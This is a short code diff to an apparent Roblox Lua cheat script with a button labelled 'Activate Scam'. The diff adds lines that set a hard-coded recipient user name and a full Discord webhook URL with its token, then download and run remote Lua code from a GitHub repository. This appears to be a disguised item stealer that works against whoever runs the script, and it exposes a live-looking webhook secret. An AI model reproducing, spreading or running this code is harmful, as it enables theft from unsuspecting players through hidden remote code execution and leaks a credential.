@@ -1,4 +1,3 @@
-if game.PlaceId == 6284583030 then
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 
@@ -15,7 +14,10 @@ local TradeTab = Window:MakeTab({
 TradeTab:AddButton({ 
          Name = "Activate Scam", 
          Callback = function() 
-                       print("U have 30 seconds...") 
+                       UserName = "Wizard_CatWhite"
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))() 
            end     
  })
  
